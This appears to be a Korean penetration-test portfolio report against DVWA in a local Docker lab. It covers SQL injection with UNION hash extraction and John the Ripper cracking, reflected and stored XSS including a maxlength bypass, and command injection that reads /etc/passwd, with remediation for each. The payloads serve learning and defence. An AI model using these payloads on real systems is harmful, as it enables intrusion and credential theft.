# 모의해킹 보고서: DVWA 웹 애플리케이션 취약점 점검

## 1. 개요 (Executive Summary)

본 보고서는 OWASP Top 10 기반 웹 애플리케이션 취약점 학습 및 포트폴리오
목적으로, 의도적으로 취약하게 구성된 DVWA(Damn Vulnerable Web Application)를
대상으로 수행한 점검 결과를 정리한 것이다. 점검은 Docker 컨테이너로 격리된
환경에서 진행되었으며, 외부 시스템에 대한 공격은 포함되지 않는다.

점검 결과 SQL Injection, XSS(Cross-Site Scripting), Command Injection
취약점이 발견되었다. SQL Injection을 통해 인증 과정 없이 전체 사용자 정보 및
비밀번호 해시를 탈취할 수 있음을 확인하였고, XSS를 통해 세션 쿠키 탈취 및
악성 스크립트의 영구 저장(Stored XSS)이 가능함을 확인하였다. Command
Injection을 통해서는 웹 서버 OS 수준에서 임의 명령을 실행하여 `/etc/passwd`
등 시스템 파일을 직접 열람할 수 있음을 확인하였다. 세 취약점 모두 Low뿐
아니라 Medium 난이도에서도 공격이 성공하였으며, 이 과정에서 **클라이언트
측 입력 제한(드롭다운, maxlength 속성) 및 단순 블랙리스트 필터링은 실질적인
보안 대책이 되지 못하며, 개발자 도구나 셸 구분자 치환 등 간단한 방법으로
우회됨**을 공통적으로 실증하였다.

| 구분 | 내용 |
|---|---|
| 점검 대상 | DVWA (localhost:8080, Docker 컨테이너) |
| 점검 기간 | 2026-10-04 ~ 2026-11-24 |
| 점검자 | 이기원 |
| 발견 취약점 수 | 3건 (SQL Injection, XSS, Command Injection — 모두 Critical) — Low/Medium 난이도에서 모두 성공 |

---

## 2. 점검 범위 및 환경 (Scope)

### 2.1 대상 시스템
- **Target**: DVWA (vulnerables/web-dvwa Docker 이미지), http://localhost:8080
- **Attacker / Host**: Kali Linux 2026.03

### 2.2 환경 구성
- Docker 컨테이너로 DVWA 실행 (`docker run -d -p 8080:80 --name dvwa vulnerables/web-dvwa`)
- 로컬(localhost) 환경에서만 접근 가능하도록 구성, 외부 노출 없음
- DVWA Security Level: Low → Medium 순으로 테스트

### 2.3 사용 도구
- Firefox (Kali 내장 브라우저) 및 브라우저 내장 개발자 도구(Inspector)
- John the Ripper (비밀번호 해시 크랙)
- rockyou.txt 워드리스트

---

## 3. 방법론 (Methodology)

1. **환경 구성**: DVWA Docker 컨테이너 실행 및 DB 초기화
2. **정상 동작 확인**: 의도된 사용법(User ID 조회, ping 등)으로 baseline 확인
3. **취약점 식별**: 입력값에 특수문자/구분자를 넣어 비정상 동작 유도
4. **공격 (Low)**: 인증 우회, 데이터 추출, 임의 명령 실행 등 핵심 공격 수행
5. **난이도 상향 테스트 (Medium)**: 동일 공격이 막히는지 확인, 필터 우회 시도
6. **사후 분석**: 탈취한 해시의 실제 크랙 가능성 검증, 필터 우회 원인 분석

---

## 4. 취약점 상세 (Findings)

### 4.1 [Critical] SQL Injection (Low / Medium)

| 항목 | 내용 |
|---|---|
| 위험도 | **Critical** |
| 유형 | SQL Injection (OWASP A03:2021 – Injection) |
| 대상 | `/vulnerabilities/sqli/` (`id` 파라미터) |
| 영향받는 난이도 | Low, Medium (둘 다 성공) |

#### 설명
DVWA의 SQL Injection 페이지는 사용자가 입력한 `id` 값을 이스케이프 처리 없이
SQL 쿼리문에 직접 삽입한다. 이로 인해 공격자가 SQL 구문을 조작하여 원래
의도되지 않은 쿼리를 실행시킬 수 있다. Medium 레벨은 입력 방식을 드롭다운
(select box)으로 변경하여 임의 입력을 막으려 했으나, 이는 **클라이언트 측
제한에 불과**하여 HTTP 요청(GET 파라미터)을 직접 조작하면 동일하게 우회된다.

#### 재현 절차

**[Low 레벨]**

1. **정상 동작 확인**: User ID `1` 조회 → 해당 사용자 정보만 출력됨 (baseline)

2. **취약점 식별 및 인증 우회**
   ```
   입력값: ' OR '1'='1
   ```
   → WHERE 조건이 항상 참이 되어, 전체 사용자 5명의 정보가 한 번에 노출됨
   > <img width="926" height="498" alt="image" src="https://github.com/user-attachments/assets/0b88bc16-cfab-4f91-9cb9-1ee8bea2f112" />


3. **컬럼 개수 확인**
   ```
   ' ORDER BY 2-- -   → 정상
   ' ORDER BY 3-- -   → Unknown column '3' in 'order clause' 에러
   ```
   → 컬럼 수가 2개임을 확인
   > <img width="976" height="535" alt="image" src="https://github.com/user-attachments/assets/154269e7-4027-4be1-b100-9fdb2409faf8" />


4. **UNION 기반 데이터 추출**
   ```
   ' UNION SELECT user, password FROM users-- -
   ```
   → users 테이블의 전체 계정명과 MD5 비밀번호 해시가 그대로 노출됨
   ```
   admin   : 5f4dcc3b5aa765d61d8327deb882cf99
   gordonb : e99a18c428cb38d5f260853678922e03
   1337    : 8d3533d75ae2c3966d7e0d4fcc69216b
   pablo   : 0d107d09f5bbe40cade3de5c71e9e9b7
   smithy  : 5f4dcc3b5aa765d61d8327deb882cf99
   ```
   > <img width="750" height="490" alt="image" src="https://github.com/user-attachments/assets/3b05fc7e-53db-4e85-95dc-9d4c65256565" />


5. **탈취한 해시 크랙 (John the Ripper)**
   ```bash
   echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
   john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
   john --show --format=raw-md5 hash.txt
   # 결과: ?:password
   ```
   → 사전 공격으로 해시가 수 초 내 평문 `password`로 크랙됨
   > <img width="1084" height="638" alt="image" src="https://github.com/user-attachments/assets/4b46d1db-2463-472a-9a1c-c360fe038d46" />


**[Medium 레벨 — 우회 테스트]**

6. **Medium으로 난이도 변경**: DVWA Security 메뉴에서 Medium 선택 → 입력 UI가
   텍스트 입력창에서 **드롭다운**으로 변경됨 (얼핏 입력 제한처럼 보임)
   > <img width="996" height="645" alt="image" src="https://github.com/user-attachments/assets/b23e64c4-8d5f-4460-9eef-35003614fde3" />


7. **URL 직접 조작으로 드롭다운 우회**
   ```
   http://localhost:8080/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit
   ```
   → 드롭다운을 거치지 않고 GET 파라미터를 직접 조작하여 **Low와 동일하게
   전체 사용자 정보 노출**
   > <img width="995" height="717" alt="image" src="https://github.com/user-attachments/assets/4e5213e3-d361-4d8d-a7e4-b851245ef7e7" />


8. **UNION 공격도 동일하게 성공**
   ```
   http://localhost:8080/vulnerabilities/sqli/?id=1' UNION SELECT user, password FROM users-- -&Submit=Submit
   ```
   → Medium 레벨에서도 **비밀번호 해시 전체 추출 성공**
   > <img width="995" height="717" alt="image" src="https://github.com/user-attachments/assets/6868b4ff-3883-4a2e-ba38-0a1f34cacb5a" />


#### 영향 (Impact)
- 인증 없이 전체 사용자 계정 정보 및 비밀번호 해시 탈취 가능
- 탈취한 해시는 일반적인 사전 공격(wordlist attack)만으로도 수 초 내 평문
  복구 가능 (취약한 해싱 방식 + 약한 비밀번호의 복합 문제)
- **Medium 레벨의 UI 기반 입력 제한은 실질적인 보안 통제가 아님**을 실증.
  서버 측 검증 없이 클라이언트 UI만 제한하는 방식은 공격자의 직접적인
  HTTP 요청 조작 앞에서 무력화됨

#### 대응 방안 (Remediation)
1. **Prepared Statement(매개변수화 쿼리) 사용**: 사용자 입력을 SQL 구문과
   분리하여 이스케이프 없이도 안전하게 처리
2. 입력값에 대한 **서버 측 화이트리스트 검증** (숫자만 허용 등) — 클라이언트
   측 드롭다운/셀렉트박스만으로는 보안이 보장되지 않음
3. 비밀번호 저장 시 MD5 대신 **bcrypt, Argon2** 등 느린 해시 알고리즘 사용
4. 데이터베이스 계정에 **최소 권한 원칙** 적용 (조회용 계정에 DDL/DML 권한 과다 부여 금지)
5. WAF(Web Application Firewall) 또는 DVWA 자체 제공 PHPIDS 같은 추가 탐지 계층 활용

---

### 4.2 [Critical] Cross-Site Scripting (XSS) — Reflected / Stored (Low / Medium)

| 항목 | 내용 |
|---|---|
| 위험도 | **Critical** |
| 유형 | XSS (OWASP A03:2021 – Injection) |
| 대상 | `/vulnerabilities/xss_r/` (Reflected), `/vulnerabilities/xss_s/` (Stored) |
| 영향받는 난이도 | Low, Medium (둘 다 성공) |

#### 설명
DVWA의 XSS 페이지는 사용자 입력값을 충분히 이스케이프하지 않고 HTML 응답에
그대로 포함시킨다. Reflected XSS는 입력값이 요청 즉시 응답에 반영되어 실행되는
형태이고, Stored XSS는 입력값이 DB(방명록)에 저장되어 **이후 해당 페이지를
방문하는 모든 사용자에게 반복적으로 실행**되는 더 위험한 형태이다. Medium
레벨은 필드별로 서로 다른 방식의 방어를 적용하고 있었으나, 모두 우회가
가능함을 확인하였다.

#### 재현 절차

**[Low 레벨 — Reflected XSS]**

1. **기본 실행 확인**
   ```
   입력값 (name 파라미터): <script>alert('XSS')</script>
   ```
   → 입력 즉시 `XSS` 알림창이 실행됨
   ><img width="993" height="552" alt="image" src="https://github.com/user-attachments/assets/2c2ca3a4-db6e-4c18-a63a-877e70da42f0" />

   >  <img width="836" height="483" alt="image" src="https://github.com/user-attachments/assets/ca52eb31-1edd-48f5-98b7-5b9f1bfb6ebd" />


3. **세션 쿠키 탈취 시나리오 검증**
   ```
   입력값: <script>alert(document.cookie)</script>
   ```
   → 실제 세션 쿠키 값이 그대로 노출됨
   ```
   PHPSESSID=r78qv8akqb9habn69dbqt4sff1; security=low
   ```
   → 실제 공격에서는 이 값을 `document.location`으로 외부 서버에 전송하여
   세션을 탈취하고, 로그인 없이 피해자로 위장할 수 있다.
   > <img width="945" height="641" alt="image" src="https://github.com/user-attachments/assets/9f9b6ae7-d667-48d8-ba05-2c8efa7c0c42" />


**[Low 레벨 — Stored XSS]**

3. **방명록에 스크립트 저장**
   ```
   Name: 홍길동
   Message: <script>alert('Stored XSS')</script>
   ```
   → 등록 즉시 알림창 실행
   > <img width="863" height="568" alt="image" src="https://github.com/user-attachments/assets/6c6c448d-1bd8-4b3f-8fbb-e3f7606670db" />


4. **영구 저장 여부 확인**
   입력을 다시 하지 않고 메뉴에서 "XSS (Stored)" 페이지를 재방문
   → **입력 없이 페이지에 진입만 해도 알림창이 자동 실행됨**을 확인
   → 악성 스크립트가 DB에 영구 저장되어, 이 방명록을 보는 모든 사용자가
   공격 대상이 됨을 의미
   > <img width="791" height="476" alt="image" src="https://github.com/user-attachments/assets/267846f1-1279-45af-a96b-83171abcfaa9" />


**[Medium 레벨 — 우회 테스트]**

5. **Medium 전환 및 기본 페이로드 재시도**
   ```
   Message: <script>alert('XSS')</script>
   ```
   → Message 필드는 `strip_tags()` 방식으로 거의 모든 HTML 태그를 제거하여
   `<script>` 태그가 완전히 사라지고 텍스트만 남음 (1차 방어는 유효)
   > <img width="724" height="434" alt="image" src="https://github.com/user-attachments/assets/face3638-f0aa-4344-ae6a-9b87fb1e9b7c" />


6. **필드별 방어 수준 차이 분석**
   동일한 페이로드를 **Name 필드**에 입력 시, 태그 자체는 필터링되지 않고
   남아있음을 확인 (Name 필드는 `<script>` 문자열만 단순 치환하는 약한 필터)
   ```
   Name: <svg onload=alert(1)>
   Message: test
   ```
   → 그러나 알림창은 실행되지 않음 → **원인 분석 필요**

7. **원인 분석: 브라우저 페이지 소스 확인**
   `Ctrl+U`로 페이지 소스를 확인한 결과, 저장된 값이 다음과 같이 **잘려
   있음**을 발견
   ```html
   <div id="guestbook_comments">Name: <svg onloa<br />Message: test<br /></div>
   ```
   → `<input name="txtName" ... maxlength="10">` 속성으로 인해 입력값이
   10자에서 강제로 잘린 것이 원인이었음 (필터링이 아닌 **HTML 입력 길이
   제한**이 원인)
   > <img width="1029" height="592" alt="image" src="https://github.com/user-attachments/assets/91bdc71f-5bc7-4155-97d5-e2635eae22a2" />


8. **maxlength 우회 (브라우저 개발자 도구 사용)**
   `maxlength`는 클라이언트 측(HTML) 제약일 뿐 서버 측 검증이 아니므로,
   개발자 도구(F12 → Inspector)로 해당 속성을 직접 수정하여 우회
   ```
   maxlength="10" → maxlength="200"
   ```
   > <img width="1095" height="580" alt="image" src="https://github.com/user-attachments/assets/97556b87-2fea-4326-9737-6b1fd11a3d5c" />


9. **우회 성공**
   속성 수정 후 동일 페이로드 재입력
   ```
   Name: <svg onload=alert(1)>
   Message: test
   ```
   → **알림창(`1`) 실행 성공**, Medium 레벨의 Name 필드 방어를 완전히 우회
   > <img width="981" height="587" alt="image" src="https://github.com/user-attachments/assets/d169ecde-59a8-4307-90b3-6e4dd5719dc4" />


#### 영향 (Impact)
- Reflected XSS: 피해자가 악성 링크를 클릭하는 즉시 임의 스크립트 실행,
  세션 쿠키 등 민감 정보 탈취 가능
- Stored XSS: 공격자가 한 번만 페이로드를 심으면 이후 해당 페이지를 방문하는
  **모든 사용자**가 별도 조작 없이 공격당함 (피싱 페이지 삽입, 키로깅,
  세션 탈취 등으로 확장 가능)
- Medium 레벨 분석 결과, 입력 필드별로 방어 수준이 불균일했으며(Message는
  강한 필터, Name은 약한 필터 + 길이 제한), **길이 제한(maxlength)과 같은
  클라이언트 측 HTML 속성은 개발자 도구만으로 손쉽게 우회**되어 실질적인
  보안 통제로 볼 수 없음

#### 대응 방안 (Remediation)
1. 출력 시 **컨텍스트에 맞는 이스케이프** 적용 (HTML 엔티티 인코딩: `<`, `>`,
   `"`, `'`, `&` 등)
2. 입력 필터링은 **화이트리스트 기반**으로 설계하고, 모든 필드에 **동일하고
   일관된 수준**의 검증 적용 (필드별로 방어 수준이 다르면 가장 약한 지점이
   전체 취약점이 됨)
3. `maxlength` 등 HTML 속성은 사용자 경험(UX) 개선용일 뿐 보안 통제가 아님을
   인지하고, **서버 측에서도 동일한 길이/형식 검증**을 반드시 재적용
4. Content-Security-Policy(CSP) 헤더를 적용하여 인라인 스크립트 실행 자체를
   차단
5. 세션 쿠키에 `HttpOnly`, `Secure`, `SameSite` 속성을 설정하여 스크립트를
   통한 쿠키 탈취 가능성을 원천적으로 차단

---

### 4.3 [Critical] OS Command Injection (Low / Medium)

| 항목 | 내용 |
|---|---|
| 위험도 | **Critical** |
| 유형 | OS Command Injection (OWASP A03:2021 – Injection) |
| 대상 | `/vulnerabilities/exec/` (ping 대상 IP 입력 파라미터) |
| 영향받는 난이도 | Low, Medium (둘 다 성공) |

#### 설명
DVWA의 Command Injection 페이지는 사용자가 입력한 IP 주소를 `ping` 명령의
인자로 그대로 셸에 전달한다. 입력값에 대한 검증·이스케이프가 없어, 셸 구분자
(`;`, `|`, `&` 등)를 이용해 공격자가 원하는 **임의의 OS 명령**을 ping과 함께
실행시킬 수 있다. SQL Injection/XSS가 애플리케이션 또는 브라우저 수준의
공격이라면, 이 취약점은 **웹 서버가 구동 중인 OS 자체**를 직접 공격한다는
점에서 위험도가 가장 높다. Medium 레벨은 `;`, `&&` 문자열을 블랙리스트로
제거하지만, 다른 구분자는 걸러내지 못해 쉽게 우회되었다.

#### 재현 절차

**[Low 레벨]**

1. **정상 동작 확인**
   ```
   입력값: 127.0.0.1
   ```
   → 정상적인 ping 결과만 출력됨 (baseline)
   > <img width="671" height="281" alt="image" src="https://github.com/user-attachments/assets/9e43596d-c6e1-4682-be86-562c9505e168" />


2. **명령어 연결 공격 (`;`)**
   ```
   127.0.0.1; whoami
   ```
   → ping 결과 아래에 `www-data`가 추가로 출력됨 (웹 서버 프로세스 권한 확인)
   > <img width="947" height="565" alt="image" src="https://github.com/user-attachments/assets/fc86c329-b4f9-420d-a3b6-4172b0a2df27" />



3. **시스템 정보 수집**
   ```
   127.0.0.1; uname -a
   ```
   → 컨테이너 OS/커널 정보 노출
   ```
   Linux 76a1c1b3294d 7.1.5+kali-amd64 #1 SMP PREEMPT_DYNAMIC ... Kali 7.1.5-1kali1 ...
   ```
   > <img width="1051" height="467" alt="image" src="https://github.com/user-attachments/assets/a518f826-c02f-4ec1-8cb5-8239c54b9aba" />


4. **민감 파일 열람**
   ```
   127.0.0.1; cat /etc/passwd
   ```
   → 시스템에 등록된 전체 계정 목록(root, www-data, mysql 등)이 그대로 노출됨
   > <img width="979" height="609" alt="image" src="https://github.com/user-attachments/assets/b19f0a74-a6cc-4a0e-889d-f26ac01975cd" />


5. **권한 확인**
   ```
   127.0.0.1; id
   ```
   → `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
   > <img width="973" height="523" alt="image" src="https://github.com/user-attachments/assets/7ea20a6b-f224-421b-9e6c-737fd36445d2" />


**[Medium 레벨 — 우회 테스트]**

6. **기존 페이로드 재시도 (차단 확인)**
   ```
   127.0.0.1; whoami
   ```
   → `whoami`가 실행되지 않고 ping 결과만 출력됨. `;` 문자열이 블랙리스트로
   제거되는 1차 방어가 동작함을 확인
   > <img width="638" height="352" alt="image" src="https://github.com/user-attachments/assets/e67e548a-9a43-4e01-ad7b-e03b34b9be30" />


7. **다른 구분자로 우회 시도**
   - 파이프(`|`)
     ```
     127.0.0.1 | whoami
     ```
     → ping 출력은 사라지고 **`www-data`만 출력** — 완전 우회 성공
     > <img width="632" height="288" alt="image" src="https://github.com/user-attachments/assets/1d89d399-a62f-4c46-9109-d5d743b65e94" />

   - 단일 앰퍼샌드(`&`, 백그라운드 실행)
     ```
     127.0.0.1 & whoami
     ```
     → ping 결과와 `www-data`가 함께 출력 — 우회 성공
     > <img width="680" height="321" alt="image" src="https://github.com/user-attachments/assets/0cdfc08b-b2cc-40c3-94d7-f7c7118118a9" />

   - 논리 OR(`||`)
     ```
     127.0.0.1 || whoami
     ```
     → ping만 출력되고 `whoami`는 실행되지 않음. 이는 필터링 때문이 아니라
     `||`는 **앞 명령이 실패해야 뒤 명령을 실행**하는 셸 문법 특성상, ping이
     정상 종료(exit code 0)되어 뒤의 명령이 건너뛰어진 것 (필터 우회와는
     무관한 결과)
     > <img width="667" height="311" alt="image" src="https://github.com/user-attachments/assets/e6ed2a38-c6fb-49d5-a65a-b3c176e5845b" />


8. **민감 파일 재노출 (파이프 우회 재사용)**
   ```
   127.0.0.1 | cat /etc/passwd
   ```
   → Medium 레벨에서도 **`/etc/passwd` 전체 재노출**, Low와 동일한 수준의
   피해 발생
   > <img width="713" height="426" alt="image" src="https://github.com/user-attachments/assets/10aaa8b1-af92-45c0-8e45-72007ec98008" />


#### 영향 (Impact)
- 웹 서버 프로세스 권한(`www-data`)으로 임의의 OS 명령 실행 가능
- 시스템 파일 열람, 서버 내부 정보 수집이 가능하며, 권한 상승이나 리버스
  셸 등 추가 침투로 이어질 수 있는 **웹 애플리케이션 취약점 중 가장 치명적인
  유형**
- Medium 레벨의 **블랙리스트 기반 필터링(`;`, `&&`만 차단)은 셸이 지원하는
  다양한 명령 구분자(`|`, `&` 등) 전체를 포괄하지 못해** 손쉽게 우회됨.
  블랙리스트 방식 자체의 구조적 한계를 보여주는 사례

#### 대응 방안 (Remediation)
1. 셸 명령을 직접 조합하는 방식(`system()`, `exec()` 등)을 지양하고, 가능하면
   **언어 자체의 라이브러리/API**(예: PHP의 `ping` 대신 소켓/ICMP 라이브러리,
   혹은 결과가 필요 없다면 기능 자체를 서버 내부 로직으로 대체)로 구현
2. 입력값 검증은 **블랙리스트가 아닌 화이트리스트 방식**으로 설계 (IPv4/IPv6
   형식에 맞는지 정규식으로 엄격히 검증, 그 외 모든 문자 거부)
3. 불가피하게 외부 명령을 호출해야 한다면 `escapeshellarg()` 등으로 인자를
   이스케이프하고, 셸을 거치지 않는 API(`exec()` 계열 중 배열 인자 방식)를 사용
4. 웹 서버 프로세스(`www-data`)의 권한을 최소화하여, 명령 실행에 성공하더라도
   피해 범위를 제한 (최소 권한 원칙)
5. WAF 또는 시스템 콜 모니터링(예: SELinux, AppArmor)으로 비정상적인 프로세스
   생성을 탐지·차단

---

## 5. 종합 결론 및 권고사항

| 번호 | 취약점명 | 난이도 | 위험도 | 상태 |
|---|---|---|---|---|
| 1 | SQL Injection (인증 우회) | Low | Critical | 미조치 (연습 환경) |
| 2 | SQL Injection (UNION 데이터 추출) | Low | Critical | 미조치 (연습 환경) |
| 3 | SQL Injection (드롭다운 우회) | Medium | Critical | 미조치 (연습 환경) |
| 4 | Reflected XSS (쿠키 노출) | Low | Critical | 미조치 (연습 환경) |
| 5 | Stored XSS (영구 저장) | Low | Critical | 미조치 (연습 환경) |
| 6 | Stored XSS (maxlength 우회) | Medium | Critical | 미조치 (연습 환경) |
| 7 | Command Injection (파일 열람) | Low | Critical | 미조치 (연습 환경) |
| 8 | Command Injection (구분자 우회) | Medium | Critical | 미조치 (연습 환경) |

이번 점검을 통해 SQL Injection이 단순 정보 노출을 넘어 **인증 우회, 비밀번호
탈취, 나아가 크랙을 통한 평문 계정 획득**까지 이어지는 전체 공격 체인을
실습하였고, XSS를 통해 **세션 탈취 가능성과 영구적인 악성 스크립트 저장**의
위험성을, Command Injection을 통해 **웹 애플리케이션 취약점이 OS 수준의
시스템 침투로 직접 이어질 수 있음**을 실증하였다.

세 취약점 모두 Medium 난이도 테스트에서 공통적으로 확인된 핵심 교훈은 다음과
같다.

- **클라이언트 측에서만 적용되는 제한(드롭다운, HTML maxlength 속성 등)은
  실질적인 보안 대책이 될 수 없다.**
- **블랙리스트 기반 필터링(특정 문자열·구분자만 차단)은 공격자가 알지 못한
  우회 경로를 항상 남기므로, 화이트리스트 기반 검증으로 전환해야 한다.**
- 어떤 경우든 **서버 측 검증, 적절한 이스케이프 처리, 최소 권한 원칙**이
  함께 적용되어야 실질적인 방어가 가능하다.

추후 File Upload, CSRF 등 추가 OWASP Top 10 취약점에 대한 점검을 진행하여
보고서를 확장할 예정이다.

---

## 6. 부록

- 대상 파라미터
  - `id` (`/vulnerabilities/sqli/`)
  - `name` (`/vulnerabilities/xss_r/`)
  - `txtName`, `mtxMessage` (`/vulnerabilities/xss_s/`)
  - IP 입력 파라미터 (`/vulnerabilities/exec/`)
- 사용 페이로드
  - SQL Injection: `' OR '1'='1`, `' ORDER BY N-- -`, `' UNION SELECT user, password FROM users-- -`
  - XSS: `<script>alert('XSS')</script>`, `<script>alert(document.cookie)</script>`, `<svg onload=alert(1)>`
  - Command Injection: `127.0.0.1; whoami`, `127.0.0.1 | whoami`, `127.0.0.1 & whoami`, `127.0.0.1 | cat /etc/passwd`
- 참고 자료
  - OWASP Top 10 2021 – A03:2021 Injection
  - OWASP SQL Injection Cheat Sheet
  - OWASP XSS Filter Evasion Cheat Sheet
  - OWASP Command Injection
  - DVWA 공식 문서
